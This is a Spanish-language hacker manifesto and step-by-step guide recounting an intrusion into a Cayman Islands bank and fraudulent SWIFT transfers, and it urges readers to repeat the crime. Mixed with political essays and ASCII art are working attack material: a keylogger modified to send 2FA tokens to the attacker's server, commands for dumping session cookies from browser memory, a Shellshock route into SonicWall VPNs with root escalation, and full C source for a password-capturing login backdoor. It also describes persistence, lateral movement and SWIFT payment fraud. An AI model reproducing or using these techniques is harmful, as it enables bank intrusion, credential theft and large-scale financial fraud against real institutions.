               _   _            _      ____             _    _ 
               | | | | __ _  ___| | __ | __ )  __ _  ___| | _| |
               | |_| |/ _` |/ __| |/ / |  _ \ / _` |/ __| |/ / |
               |  _  | (_| | (__|   <  | |_) | (_| | (__|   <|_|
               |_| |_|\__,_|\___|_|\_\ |____/ \__,_|\___|_|\_(_)

                         Una guía DIY para robar bancos
                        
                        
                                  ^__^
                                  (oo)\_______
                               (  (__)\       )\/\
                                _) /  ||----w |
                               (.)/   ||     ||
                                `'
                          Por el Subcowmandante Marcos
                             

                             
                             
                               Soy un niño salvaje
                           Inocente, libre, silvestre
                             Tengo todas las edades
                            Mis abuelos viven en mí

                            Soy hermano de las nubes
                              Y sólo sé compartir
                            Sé que todo es de todos
                            que todo está vivo en mí

                           Mi corazón es una estrella
                             Soy hijo de la tierra
                          Viajo a bordo de mi espíritu
                             Camino a la eternidad


Ésta es mi palabra sencilla que busca tocar el corazón de la gente simple y
humilde, pero también digna y rebelde. Ésta es mi palabra sencilla para contar
de mis hackeos, y para invitar a otras personas a que hackeen con alegre
rebeldía.

Hackeé un banco. Lo hice para dar una inyección de liquidez, pero esta vez desde
abajo y a la gente simple y humilde que resiste y se rebela contra las
injusticias en todo el mundo. En otras palabras: robé un banco y regalé el
dinero. Pero no fui yo sola quien lo hizo. El movimiento del software libre, la
comunidad del powershell ofensivo, el proyecto metasploit y la comunidad hacker
en general son las que posibilitaron este hackeo. La comunidad de exploit.in
hizo posible convertir la intrusión en las computadoras de un banco en efectivo
y bitcoin. Los proyectos Tor, Qubes y Whonix, junto a las y los criptógrafos y
activistas que defienden la privacidad y el anonimato, son mis nahuales, es
decir, mis protectores [1]. Me acompañan cada noche y hacen posible que siga en
libertad.

No hice nada complicado. Solamente vi la injusticia en este mundo, sentí amor
por todos los seres, y expresé ese amor de la mejor forma que pude, mediante las
herramientas que sé usar. No me mueve el odio a los bancos, ni a los ricos, sino
un amor por la vida, y el deseo de un mundo donde cada quien pueda realizar su
potencial y vivir una vida plena. Quisiera explicar un poco cómo veo el mundo,
para que puedan hacerse una idea de cómo es que llegué a sentirme y actuar así.
Y espero también que esta guía sea una receta que puedan seguir, combinando los
mismos ingredientes para hornear el mismo bizcocho. Quién sabe, por ahí estas
herramientas tan potentes acaban sirviéndoles también a ustedes para expresar el
amor que sienten.


                           Todos somos niños salvajes
                         inocentes, libres, silvestres

                      Todos somos hermanos de los árboles
                               hijos de la tierra

                   Sólo tenemos que poner en nuestro corazón
                             una estrella encendida

                    (canción de Alberto Kuselman y Chamalú)


La policía va a invertir un chingo de recursos en investigarme. Creen que el
sistema funciona, o al menos que funcionará una vez que atrapen a todos los
"chicos malos". No soy más que el producto de un sistema que no funciona.
Mientras existan la injusticia, la explotación, la alienación, la violencia y la
destrucción ecológica, vendrán muchas más como yo: una serie interminable de 
personas que rechazarán por ilegítimo el mal sistema responsable de este
sufrimiento. Ese sistema mal hecho no se va a componer arrestándome. Soy 
solamente una de las millones de semillas que Tupac plantó hace 238 años en La
Paz [2], y espero que mis acciones y escritos rieguen la semilla de la rebelión
en sus corazones.

[1] https://es.wikipedia.org/wiki/Cadejo#Origen_y_significado_del_mito
[2] fue antes de ser asesinado por los españoles, justo un día como ayer, que
    dijo eso de "a mi solo me matarán, pero mañana volveré y seré millones".

 ____________________________________________
< Para que nos vieran, nos tapamos el rostro >
 --------------------------------------------
         \
          \ ^__^
            (oo)\_______
         (  (__)\       )\/\
          _) /  ||----w |
         (.)/   ||     ||
          `'
Para hacernos escuchar, a lxs hackers a veces nos toca taparnos la cara, porque
no nos interesa que vean nuestro rostro sino que entiendan nuestra palabra. La
máscara puede ser de Guy Fawkes, de Salvador Dalí, de Fsociety, o en algún caso
la marioneta de un sapo con cresta. Por afinidad, esta vez fui a desenterrar a
un difunto para prestarme su pasamontañas. Creo entonces que debería aclarar que
el Sup Marcos es inocente de todo lo que aquí se cuenta porque, además de estar
muerto, no le consulté. Espero que su fantasma, si se entera desde alguna hamaca
chiapaneca, sepa encontrar la bondad para, como dicen allá, "desestimar este
deep fake" con el mismo gesto con que se aleja un insecto inoportuno - que bien
podría ser un escarabajo.

Aún así con el pasamontañas y el cambio de nombre, muchos de los que apoyan mis
acciones quizás van a prestar demasiada atención a mi persona. Con su propia
autonomía hecha trizas por una vida entera de dominación, estarán buscando un
líder a seguir, o una heroína que les salve. Pero detrás del pasamontañas sólo
soy una niña. Todos somos niños salvajes. Nós só temos que colocar uma estrela
em chamas em nossos corações.



--[ 1 - Por qué expropiar ]-----------------------------------------------------

El capitalismo es un sistema en el que una minoría se ha venido a apropiar de 
una vasta mayoría de los recursos del mundo a través de la guerra, el hurto y 
la explotación. Al arrebatarnos los comunes [1], forzaron a los de abajo a 
estar bajo el control de esa minoría que todo lo posee. Es un sistema
fundamentalmente incompatible con la libertad, la igualdad, la democracia y el 
Suma Qamaña (Buen Vivir). Puede sonar ridículo para las que hemos crecido en una
maquinaria propagandística que nos enseñó que capitalismo es libertad, pero en
verdad esto que digo no es una idea nueva ni controvertida [2]. Los fundadores
de los Estados Unidos de América sabían que tenían que elegir entre crear una
sociedad capitalista, o una libre y democrática. Madison reconocía que "el
hombre que posee riqueza, el que se acuesta en su sofá o rueda en su carruaje,
no puede juzgar los deseos o sentimientos del jornalero". Pero para protegerse
frente al "espíritu de equiparación" de los jornaleros sin tierra, le pareció
que solamente los terratenientes debían votar, y que el gobierno tenía que
servir para "proteger a la minoria opulenta frente a la gran mayoria". John
Jay fue más al grano y dijo: "Aquellos que son dueños del país deberían
gobernarlo".

 ____________________________________________________
/     No existe eso que llaman capitalismo verde.    \
|  Hagamos al capitalismo historia antes de que nos  |
\             convierta en historia.                 /
 ----------------------------------------------------
 \     /\  ___  /\
  \   // \/   \/ \\
     ((    O O    ))
      \\ /     \ //
       \/  | |  \/ 
        |  | |  |   Evgeny, el gran elefante ignorado, no entiende por qué todos
        |  | |  |   fingen no verle en los paneles sobre cambio climático, así 
        |   o   |   que aquí le doy chance a decir sus líneas.
        | |   | | 
        |m|   |m|  

   
De la misma forma que bell hooks [3] sostiene que el rechazo a la cultura
patriarcal de dominación es un acto en defensa del propio interés del varón (ya
que emocionalmente les mutila y evita que sientan amor y conexión de forma
plena), creo que la cultura de dominación del capitalismo tiene un efecto
similar sobre los ricos, y que podrían tener vidas más plenas y satisfactorias
si rechazaran el sistema de clases del que creen que se benefician. Para muchos,
el privilegio de clase equivale a una infancia de negligencia emocional, seguida
de una vida de interacciones sociales superficiales y trabajo sin sentido. Puede
que en el fondo sepan que sólo pueden conectar de forma genuina con las personas
cuando trabajan con ellas como sus iguales, y no cuando las ponen a su servicio.
Puede que sepan que compartir su riqueza material es lo mejor que pueden hacer 
con ella. Quizás sepan también que las experiencias significativas, las 
conexiones y las relaciones que cuentan no son las que provienen de las 
interacciones mercantiles, sino precisamente de rechazar la lógica del mercado 
y dar sin esperar nada a cambio. Tal vez sepan que todo lo que necesitan para 
escapar de su prisión y vivir de verdad es dejarse llevar, ceder el control, y 
dar un salto de fe. Pero a la mayoría les falta valentía.

Entonces sería ingenuo por nuestra parte dirigir nuestros esfuerzos a tratar de 
producir alguna clase de despertar espiritual en los ricos [4]. Como dice Assata 
Shakur: "Nadie en el mundo, nadie en la historia, ha conseguido nunca su 
libertad apelando al sentido moral de sus opresores". En realidad, cuando los 
ricos reparten su dinero, casi siempre lo hacen de un modo que refuerza el
sistema que para empezar les permitió amasar sus enormes e ilegítimas riquezas
[5]. Y es poco probable que el cambio venga a través de un proceso político;
como dice Lucy Parsons: "No nos dejemos nunca engañar con que los ricos nos
vayan a dejar votar para arrebatarles sus riquezas". Colin Jenkins justifica la
expropiación con estas palabras [6]:

    No nos equivoquemos, la expropiación no es robo. No es la confiscación de 
    dinero ganado "con el sudor de la frente". No es el robo de propiedad 
    privada. Es, más bien, la recuperación de enormes cantidades de tierra y 
    riqueza que han sido forjadas con recursos naturales robados, esclavitud 
    humana, fuerza de trabajo forzada y amasada en cientos de años por una 
    pequeña minoría. Esta riqueza... es ilegítima, tanto a efectos morales como 
    en tanto a los mecanismos de explotación que se han empleado para crearla.

Para Colin, el primer paso es que "tenemos que liberarnos de nuestras ataduras 
mentales (al creer que la riqueza y la propiedad privada han sido ganadas por 
quienes las monopolizan; y que, por tanto, deberían ser algo a respetar, 
reverenciar, e incluso algo a perseguir), abrir nuestras mentes, estudiar y 
aprender de la historia, y reconocer juntos esta ilegitimidad". Acá les dejo 
algunos libros que me han ayudado con esto [7][8][9][10][11].

Según Barack Obama, la desigualdad económica es "el desafío que define a nuestro
tiempo". El hacking informático es una herramienta poderosa para combatir la
desigualdad económica. El antiguo director de la NSA, Keith Alexander, concuerda
y dice que el hacking es responsable de "la mayor transferencia de riqueza de la
historia".

 _________________________
/ La historia es nuestra  \
\ y la hacen lxs hackers! /
 -------------------------
         \
          \ ^__^
            (oo)\_______
         (  (__)\       )\/\
          _) /  ||----w |
         (.)/   ||     ||
          `'
¡Allende presente, ahora y siempre!

[1] https://sursiendo.com/docs/Pensar_desde_los_comunes_web.pdf
[2] https://chomsky.info/commongood02/
[3] The Will to Change: Men, Masculinity, and Love
[4] su propia religión ya es muy clara al respecto:
    https://dailyverses.net/es/materialismo
[5] https://elpulso.hn/la-filantropia-en-los-tiempos-del-capitalismo/
[6] http://www.hamptoninstitution.org/expropriation-or-bust.html
[7] Manifiesto por una Civilización Democrática. Volumen 1, Civilización: La Era
    de los Dioses Enmascarados y los Reyes Cubiertos
[8] Calibán y la Bruja
[9] En deuda: Una historia alternativa de la economía
[10] La otra historia de los Estados Unidos
[11] Las venas abiertas de América Latina



                    _________________________________
                   < Nuestra arma es nuestro teclado >
                    ---------------------------------
                              \
                               \ ^__^
                                 (oo)\_______
                              (  (__)\       )\/\
                               _) /  ||----w |
                              (.)/   ||     ||
                               `'    ^^     ^^

--[ 2 - Introducción ]----------------------------------------------------------

Esta guía explica cómo fue que hice el hackeo al Cayman Bank and Trust Company 
(Isla de Man). ¿Por qué estoy publicando esto, casi cuatro años después?

1) Para mostrar lo que es posible

Los hackers que trabajan por el cambio social se han limitado a desarrollar 
herramientas de seguridad y privacidad, DDoS, realizar defaceos y filtraciones. 
Allá por donde vayas hay proyectos radicales por un cambio social en completo 
estado de precariedad, y sería mucho lo que podrían hacer con un poco de dinero 
expropiado. Al menos para la clase trabajadora, el robo de un banco es algo 
socialmente aceptado, y a los que lo hacen se les ve como héroes del pueblo. En 
la era digital, robar un banco es un acto no violento, menos arriesgado, y la 
recompensa es mayor que nunca. Entonces ¿por qué son solamente los hackers de 
sombrero negro que lo hacen para beneficio personal de ellos, y nunca los 
hacktivistas para financiar proyectos radicales? Quizás no se creen que son 
capaces de hacerlo. Los grandes hackeos bancarios salen en los noticieros cada
tanto, como el hackeo al Banco de Bangladesh [1], que fue atribuido a Corea del
Norte, o los hackeos a bancos atribuidos al grupo Carbanak [2], al que describen
como un grupo muy grande y bien organizado de hackers rusos, con distintos
miembros que estarían especializados en diferentes tareas. Y, pues no es tan 
complicado.

Es por nuestra creencia colectiva en que el sistema financiero es incuestionable
que ejercemos control sobre nosotras mismas, y mantenemos el sistema de clases
sin que los de arriba tengan que hacer nada [3]. Poder ver cómo de vulnerable y
frágil es en realidad el sistema financiero nos ayuda a romper esa alucinación
colectiva. Por eso los bancos tienen un fuerte incentivo para no reportar los
hackeos, y para exagerar cómo de sofisticados son los atacantes. Ninguno de los
hackeos financieros que hice, o de los que he sabido, ha sido nunca reportado.
Este va a ser el primero, y no porque el banco quisiera, sino porque yo me
decidí a publicarlo.

Como estás a punto de aprender en esta guía casera, hackear un banco y
transferir los dineros a través de la red SWIFT no requiere del apoyo de ningún 
gobierno, ni de un grupo grande y especializado. Es algo totalmente posible 
siendo un mero hacker aficionado y del montón, con tan solo herramientas
públicas y conocimientos básicos de cómo se escribe un script.

[1] https://elpais.com/economia/2016/03/17/actualidad/1458200294_374693.html
[2] https://securelist.lat/el-gran-robo-de-banco-el-apt-carbanak/67508/
[3] https://es.wikipedia.org/wiki/Hegemon%C3%ADa_cultural

2) Ayudar a retirar el efectivo

Muchos de los que lean esto ya tienen, o con un poco de estudio van a ser 
capaces de adquirir, las habilidades necesarias para llevar a cabo un hackeo 
como este. Sin embargo, muchos se van a encontrar con que les faltan las 
conexiones criminales necesarias para sacar los mangos en condiciones. En mi
caso, este era el primer banco que hackeaba, y en ese momento sólo tenía unas
pocas y mediocres cuentas preparadas para poder retirar el efectivo (conocidas
como bank drops), así que solamente fueron unos cuantos cientos de miles los que
pude retirar en total, cuando lo normal es sacar millones. Ahora, en cambio, sí
que tengo el conocimiento y las conexiones para sacar efectivo más en serio, de
modo que si se encuentran hackeando un banco pero necesitan ayuda para convertir
eso en dinero de a de veras, y quieren usar esa lana para financiar proyectos
sociales radicales, se ponen en contacto conmigo.

3) Colaborar

Es posible hackear bancos como una aficionada que trabaja en solitario, pero la 
neta es que, por lo general, no es tan fácil como lo pinto acá. Tuve suerte con 
este banco por varias razones:

1) Era un banco pequeño, por lo que me tomó mucho menos tiempo llegar a  
   comprender cómo funcionaba todo.

2) No tenían ningún procedimiento para revisar los mensajes swift enviados. 
   Muchos bancos tienen uno, y necesitas escribir código para esconder tus 
   transferencias de su sistema de monitorización.

3) Sólo usaban autenticación por contraseña para acceder a la aplicación con la 
   que se conectaban a la red SWIFT. La mayoría de los bancos ahora usan RSA 
   SecurID, o alguna forma de 2FA. Puedes saltarte esto escribiendo código para 
   recibir una alerta cuando entren su token, y así poder usarlo antes de que
   expire. Es más sencillo de lo que parece: he usado Get-Keystrokes [1],
   modificándolo para que en vez de almacenar las teclas pulsadas, se haga una
   petición GET a mi servidor cada vez que se detecta que han introducido un
   nombre de usuario. Esta petición añade el nombre de usuario a la url y,
   conforme tipean el token, se hacen varios GET con los dígitos del token
   concatenados a la url. En mi lado dejo esto corriendo mientras tanto:

   ssh yo@mi_servidor_secreto 'tail -f /var/log/apache2/access_log'
    | while read i; do echo $i; aplay alarma.wav &> /dev/null; done

   Si es una aplicación web, puedes saltarte el 2FA robándoles la cookie 
   después de que se hayan autenticado. No soy un APT con un equipo de coders 
   que puedan hacerme herramientas a medida. Soy una persona sencilla que vive
   de lo que le da la terminal [2], de modo que lo que uso es:

   procdump64 /accepteula -r -ma PID_del_browser
   strings64 /accepteula *.dmp | findstr PHPSESSID 2> nul

   o pasándolo por findstr antes que por strings, lo que lo hace mucho más
   rápido:
   
   findstr PHPSESSID *.dmp > tmp
   strings64 /accepteula tmp | findstr PHPSESSID 2> nul

   Otra forma de saltártelo es accediendo a su sesión con un VNC oculto (hvnc)
   después de que se hayan autenticado, o con un poco de creatividad también 
   podrías enfocarte en otra parte de su proceso en lugar de enviar mensajes 
   SWIFT directamente.

Creo que si colaborase con otros hackers bancarios con experiencia podríamos 
hacernos cientos de bancos como Carnabak, en vez de estar haciendo uno de tanto 
en tanto por mi cuenta. Así que si tienes experiencia con hackeos similares y 
quieres colaborar, contactame. Encontrarás mi correo y mi llave PGP al final de 
la guía anterior [3].

[1] https://github.com/PowerShellMafia/PowerSploit/blob/master/
    Exfiltration/Get-Keystrokes.ps1
[2] https://lolbas-project.github.io/
[3] https://www.exploit-db.com/papers/41914

 ________________________________________
/ Si robar un banco cambiara las cosas,  \
\ lo harían ilegal                       /
 ----------------------------------------
         \
          \ ^__^
            (oo)\_______
         (  (__)\       )\/\
          _) /  ||----w |
         (.)/   ||     ||
          `'

--[ 3 - Tengan cuidado ahí fuera ]----------------------------------------------

Es importante tomar algunas precauciones sencillas. Voy a remitirme a esta 
misma sección de mi última guía [1], ya que por lo visto funciona bien nomás
[2]. Todo lo que tengo que añadir es que, en palabras de Trump, "A menos que
atrapes a los hackers in fraganti, es rete-difícil determinar quién es que
estaba realizando el hackeo", de modo que la policía se está volviendo más y más 
creativa [3][4] en sus intentos de agarrar a los criminales en el acto (cuando 
sus discos duros cifrados están desbloqueados). Así que estaría bueno si por 
ejemplo llevas encima un cierto dispositivo bluetooth y configuras tu
computadora para que se apague cuando se aleje más allá de un cierto rango, o
cuando un acelerómetro detecta movimiento, o algo por el estilo.

Puede que escribir artículos largos detallando tus acciones y tu ideología no 
sea la cosa más segura del mundo (¡ups!), pero a ratos siento que tenía que
hacerlo.

                        Si no creyera en quien me escucha
                        Si no creyera en lo que duele
                        Si no creyera en lo que quede
                        Si no creyera en lo que lucha
                        Que cosa fuera...
                        ¿Que cosa fuera la maza sin cantera?

[1] https://www.exploit-db.com/papers/41914
[2] https://www.wifi-libre.com/topic-1268-italia-se-rinde-y-deja-de-buscar-a-
    phineas-fisher.html
[3] https://www.wired.com/2015/05/silk-road-2/
[4] https://motherboard.vice.com/en_us/article/59wwxx/fbi-airs-alexandre-cazes-
    alphabay-arrest-video


    ,-\__ 
    |f-"Y\   ____________________
    \()7L/  |     ¡Sé gay!       |
     cgD    |  ¡Haz el crimen!   |  __ _
     |\(    --------------------- .'  Y '>,
      \ \                \       / _   _   \
       \\\                \      )(_) (_)(|}
        \\\                      {  4A   } /
         \\\                      \uLuJJ/\l
          \\\                     |3    p)/
           \\\___ __________      /nnm_n//
           c7___-__,__-)\,__)(".  \_>-<_/D
                      //V     \_"-._.__G G_c__.-__<"/ ( \
                             <"-._>__-,G_.___)\   \7\
                            ("-.__.| \"<.__.-" )   \ \
                            |"-.__"\  |"-.__.-".\   \ \
                            ("-.__"". \"-.__.-".|    \_\
                            \"-.__""|!|"-.__.-".)     \ \
                             "-.__""\_|"-.__.-"./      \ l
                              ".__""">G>-.__.-">       .--,_
                                  ""  G

        Muchos culpan a las personas queer del declive de esta sociedad;
                         estamos orgullosxs de ello
                Algunos creen que queremos reducir a cenizas
                     esta civilización y su tejido moral;
                      No podrían estar más en lo cierto
    Con frecuencia nos describen como depravadxs, decadentes y revoltosxs
                    Pero ¡ay! No han visto nada todavía

https://theanarchistlibrary.org/library/mary-nardini-gang-be-gay-do-crime


--[ 4 - Conseguir acceso ]------------------------------------------------------

En otro lugar [1] les platicaba acerca de las vías principales para conseguir
acceso inicial a la red de una compañía durante un ataque dirigido. Sin embargo,
éste no era un ataque dirigido. No me propuse hackear un banco específico, lo
que quería era hackear cualquier banco, lo cual termina siendo una tarea mucho
más sencilla. Este tipo de enfoque inespecífico fue popularizado por Lulzsec y
Anonymous [2]. Como parte de [1], preparé un exploit y unas herramientas de
post-explotación para un dispositivo de VPN popular. Luego me puse a escanear la
internet entera con zmap [3] y zgrab para identificar otros dispositivos
vulnerables. Hice que el escaner guardara las IPs vulnerables, junto con el
"common name" y los "alt names" del certificado SSL del dispositivo, los nombres
de dominio de windows del dispositivo, y la búsqueda DNS inversa de la IP. Le
hice un grep al resultado en busca de la palabra "banco", y había bastante para
elegir, pero la verdad es que me atrajo la palabra "Cayman", y fue así que vine
a quedarme con este.

[1] https://www.exploit-db.com/papers/41914
[2] https://web.archive.org/web/20190329001614/http://infosuck.org/0x0098.png
[3] https://github.com/zmap/zmap


----[ 4.1 - El Exploit ]--------------------------------------------------------

Cuando publiqué mi última guía DIY [1] no revelé los detalles del exploit de
sonicwall que había usado para hackear a Hacking Team, ya que era muy útil para
otros hackeos, como este mismo, y todavía no había acabado de divertirme con él.
Determinada entonces a hackear a Hacking Team, pasé semanas haciendo ingeniería
inversa a su modelo del ssl-vpn de sonicwall, e incluso conseguí encontrar
varias vulnerabilidades de corrupción de memoria más o menos difíciles de
explotar, antes de darme cuenta de que el dispositivo era fácilmente explotable
con shellshock [2]. Cuando salió shellshock, muchos dispositivos sonicwall eran
vulnerables, sólo con una petición a cgi-bin/welcome, y un payload en el
user-agent. Dell sacó una actualización de seguridad y un advisory para estas
versiones. La versión usada por Hacking Team y este banco tenía la versión de
bash vulnerable, pero las peticiones cgi no disparaban el shellshock excepto por
las peticiones a un shell script, y justo había uno accesible:
cgi-bin/jarrewrite.sh. Esto parece que se les escapó a los de Dell en su nota,
ya que nunca sacaron una actualización de seguridad ni un advisory para esa
versión del sonicwall. Y, amablemente, Dell había hecho dos2unix setuid root,
dejando un dispositivo fácil de rootear.

En mi última guía muchos leyeron que pasé semanas investigando un dispositivo 
hasta dar con un exploit, y asumieron que eso significaba que yo era algún tipo
de hacker de élite. La realidad, es decir, el hecho de que me llevó dos semanas
darme cuenta de que era trivialmente explotable con shellshock, es tal vez menos
halagadora para mí, pero pienso que también es más inspiradora. Demuestra que
de verdad tú puedes hacer esto por tí misma. No necesitas ser un genio, yo
ciertamente no lo soy. En realidad mi trabajo contra Hacking Team comenzó un
año antes. Cuando descubrí a Hacking Team y al Grupo Gamma en las
investigaciones de CitizenLab [3][4], decidí explorar un poco y ver si podía
encontrar algo. No llegué a ninguna parte con Hacking Team, pero tuve suerte con
Gamma Group, y pude hackear su portal de atención al cliente con inyección sql
básica y vulnerabilidades de subida de archivos [5][6]. Sin embargo, a pesar de
que su servidor de soporte me daba un pivote hacia la red interna de Gamma
Group, fui incapaz de penetrar mas allá en la compañía. A partir de esta
experiencia con el Grupo Gamma y otros hacks, me di cuenta de que estaba
realmente limitada por mi falta de conocimiento sobre escalada de privilegios y
movimiento lateral en dominios windows, active directory y windows en general.
Así que estudié y practiqué (ver sección 11), hasta que sentí que estaba lista
para volver a hacerle una visita a Hacking Team casi un año después. La práctica
dio sus frutos, y esa vez fui capaz de realizar un compromiso completo de la
compañía [7]. Antes de darme cuenta de que podía entrar con shellshock, estaba
dispuesta a pasar meses enteros feliz de la vida estudiando desarrollo de
exploits y escribiendo un exploit confiable para una de las vulnerabilidades de
corrupción de memoria que había encontrado. Sólo sabía que Hacking Team
necesitaba ser expuesto, y que me tomaría tanto tiempo como fuese necesario y
aprendería lo que tuviese que aprender para conseguirlo. Para realizar estos
hacks no necesitas ser brillante. Ni siquiera necesitas un gran conocimiento
técnico. Sólo necesitas dedicación, y creer en tí misma.

[1] https://www.exploit-db.com/papers/41914
[2] https://es.wikipedia.org/wiki/Shellshock_(error_de_software)
[3] https://citizenlab.ca/tag/hacking-team/
[4] https://citizenlab.ca/tag/finfisher/
[5] https://theintercept.com/2014/08/07/leaked-files-german-spy-company-helped-
    bahrain-track-arab-spring-protesters/
[6] https://www.exploit-db.com/papers/41913
[7] https://web.archive.org/web/20150706095436/https://twitter.com/hackingteam


----[ 4.2 - El Backdoor ]-------------------------------------------------------

Parte del backdoor que preparé para Hacking Team (véase [1], sección 6) era un 
wrapper sencillo sobre la página de login para capturar contraseñas:

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>

int main()
{
        char buf[2048];
        int nread, pfile;

        /* jala el log si mandamos una cookie especial */
        char *cookies = getenv("HTTP_COOKIE");
        if (cookies && strstr(cookies, "nuestra contraseña privada")) {
                write(1, "Content-type: text/plain\n\n", 26);
                pfile = open("/tmp/.pfile", O_RDONLY);
                while ((nread = read(pfile, buf, sizeof(buf))) > 0)
                        write(1, buf, nread);
                exit(0);
        }

        /* el principal almacena los datos del POST y se los envía al hijo,
           que es el programa de login real */
        int fd[2];
        pipe(fd);
        pfile = open("/tmp/.pfile", O_APPEND | O_CREAT | O_WRONLY, 0600);
        if (fork()) {
                close(fd[0]);

                while ((nread = read(0, buf, sizeof(buf))) > 0) {
                        write(fd[1], buf, nread);
                        write(pfile, buf, nread);
                }

                write(pfile, "\n", 1);
                close(fd[1]);
                close(pfile);
                wait(NULL);
        } else {
                close(fd[1]);
                dup2(fd[0],0);
                close(fd[0]);
                execl("/usr/src/EasyAccess/www/cgi-bin/.userLogin", 
                      "userLogin", NULL);
        }
}

En el caso de Hacking Team, se logueaban a la VPN con passwords de un solo uso,
de modo que la VPN me dio acceso solamente a la red, y a partir de ahí me tomó
un esfuerzo extra conseguir admin de dominio en su red. En la otra guía escribí
sobre pases laterales y escalada de privilegios en dominios windows [1]. En este
caso, en cambio, eran las mismas contraseñas de dominio de windows las que se
usaban para autenticarse contra la VPN, así que pude conseguir un buen de
contraseñas de usuarios, incluyendo la del admin de dominio. Ahora tenía total
acceso a su red, pero usualmente esta es la parte fácil. La parte más complicada
es entender cómo es que operan y cómo sacar el pisto.

[1] https://www.exploit-db.com/papers/41914


----[ 4.3 - Datos curiosos ]----------------------------------------------------

Al seguir la investigación que hicieron sobre el hackeo, me resultó interesante
ver que, por la misma época en que yo lo hice, el banco pudo haber sido
comprometido por alguna otra persona mediante un email de phishing dirigido [1].
Como dice el viejo dicho, "dale a una persona un exploit y tendrá acceso por un
día, enséñale a phishear y tendrá acceso toda su vida" [2]. El hecho de que
alguien más, por casualidad y al mismo tiempo que yo, se pusiera este banco
pequeño en la mira (registraron un dominio similar al dominio real del banco
para poder enviar el phishing desde ahí) hace pensar que los hackeos bancarios
ocurren con mucha más frecuencia de lo que se conoce.

Una sugerencia divertida para que puedas seguir las investigaciones de tus 
hackeos es tener un acceso de respaldo, uno que no vas a tocar a menos que 
pierdas el acceso normal. Tengo un script sencillo que espera comandos una 
vez al dia, o menos, sólo para mantener acceso a largo plazo en el caso de 
que bloqueen mi acceso regular. Luego tenía un powershell empire [3] 
llamando a casa con más frecuencia a una IP diferente, y usaba empire para 
lanzar meterpreter [4] contra una tercera IP, donde realizaba la mayor parte de 
mi trabajo. Cuando PWC se puso a investigar el hackeo, encontraron mi uso de 
empire y meterpreter y limpiaron esas computadoras y bloquearon esas IPs, pero 
no detectaron mi acceso de respaldo. PWC habia colocado dispositivos de 
monitoreo de red, para poder analizar el tráfico y ver si todavía había 
computadoras infectadas, de modo que no quería conectarme mucho a su red. Sólo 
lancé mimikatz una vez para obtener las nuevas contraseñas, y a partir de ahí 
pude seguir sus investigaciones leyendo sus correos en el outlook web access.

[1] página 47, Project Pallid Nutmeg.pdf, en torrent
[2] https://twitter.com/thegrugq/status/563964286783877121
[3] https://github.com/EmpireProject/Empire
[4] https://github.com/rapid7/metasploit-framework


--[ 5 - Entender las Operaciones Bancarias ]------------------------------------

Para entender cómo operaba el banco, y cómo podría sacar dinero, seguí las 
técnicas que resumí en [1], en la sección "13.3 - Reconocimiento Interno". 
Descargué una lista de todos los nombres de archivos, le hice un grep en busca 
de palabras como "SWIFT" y "transferencia", y descargué y leí todos los 
archivos con nombres interesantes. También busqué correos de empleados, pero de 
lejos la técnica más útil fue usar keyloggers y capturas de pantalla para
observar cómo trabajaban los empleados del banco. No lo sabía por entonces, pero 
para esto windows trae una herramienta buenisima de monitoreo [2]. Como se
describe en la técnica no. 5 del apartado 13.3 en [1], hice una captura de las
teclas pulsadas en todo el dominio (incluyendo los títulos de ventana), hice un
grep en busca de SWIFT, y encontré algunos empleados abriendo 'SWIFT Access
Service Bureau - Logon'. Para esos empleados, corrí meterpreter como en [3], y
usé el módulo post/windows/gather/screen_spy para tomar capturas de pantalla
cada 5 segundos, para observar cómo es que trabajaban. Estaban usando una app
citrix remota de la compañía bottomline [4] para acceder a la red SWIFT, donde
cada mensaje de pago SWIFT MT103 tenía que pasar a través de tres empleados: uno
para "crear" el mensaje, uno para "verificarlo", y otro para "autorizarlo". Como
ya tenía todas sus credenciales gracias al keylogger, pude realizar con
facilidad los tres pasos yo misma. Y por lo que sabía después de haberles visto
trabajar, no revisaban los mensajes SWIFT enviados, de modo que debería tener
suficiente tiempo para sacar el dinero de mis bank drops antes de que el banco
se diera cuenta e intentara revertir las transferencias.

[1] https://www.exploit-db.com/papers/41914
[2] https://cyberarms.wordpress.com/2016/02/13/using-problem-steps-recorder-psr-
    remotely-with-metasploit/
[3] https://www.trustedsec.com/blog/no_psexec_needed/
[4] https://www.bottomline.com/uk/products/bottomline-swift-access-services

 _________________________________________
/ Quien roba a un ladrón, tiene cien años \
\ de perdón.                              /
 -----------------------------------------
         \
          \ ^__^
            (oo)\_______
         (  (__)\       )\/\
          _) /  ||----w |
         (.)/   ||     ||
          `'

--[ 6 - Enviar el dinero ]------------------------------------------------------

No tenía mucha idea de lo que estaba haciendo, así que lo iba descubriendo 
por el camino. De algún modo, las primeras transferencias que envié salieron 
bien. Al día siguiente, la cagué enviando una transferencia a méxico que puso 
fin a mi diversión. Este banco enviaba sus transferencias internacionales 
a través de su cuenta corresponsal en Natwest. Había visto que la cuenta
corresponsal para las transferencias en libras esterlinas (GBP) aparecía como
NWBKGB2LGPL, mientras que para las demás era NWBKGB2LXXX. La transferencia
mexicana estaba en GBP, así que asumí que tenía que poner NWBKGB2LGPL como
corresponsal. Si lo hubiera preparado mejor habría sabido que el GPL en lugar de
XXX señalaba que el pago se enviaría a través del Servicio de Pagos Rápidos del
Reino Unido, en lugar de como una transferencia internacional, lo que obviamente
pues no va a funcionar cuando estás tratando de enviar dinero a méxico. Así que
al banco le llegó un mensaje de error. El mismo día también traté de enviar un
pago de £200k a UK usando NWBKGB2LGPL, que no se hizo porque 200k sobrepasaba el
límite de envío mediante pagos rápidos, y hubiera tenido que usar NWBKGB2LXXX en
vez. También recibieron un mensaje de error por esto. Leyeron los mensajes, lo
investigaron, y encontraron el resto de mis transferencias.


--[ 7 - El botín ]--------------------------------------------------------------

Por lo que escribo ya se harán una noción cabal de cuáles son mis ideales y a
qué cosas les doy mi apoyo. Pero no quisiera ver a nadie en problemas legales 
por recibir fondos expropiados, así que ni una palabra más de para dónde se 
fue la lana. Sé que los periodistas probablemente van a querer poner algún 
número sobre cuántos dólares fueron distribuidos en este hackeo y otros
parecidos, pero prefiero no alentar nuestro perverso hábito de medir las 
acciones nomás por su valor económico. Cualquier acción es admirable si es que 
viene desde el amor y no desde el ego. Por desgracia los de arriba, los ricos y
poderosos, las figuras públicas, los hombres de negocios, la gente en posiciones
"importantes", aquellos que nuestra sociedad más respeta y valora, esos se han
colocado donde están a base de actuar más desde el ego que desde el amor. Es en
la gente sencilla, humilde e "invisible" en quien deberíamos fijarnos y a
quienes deberíamos admirar.


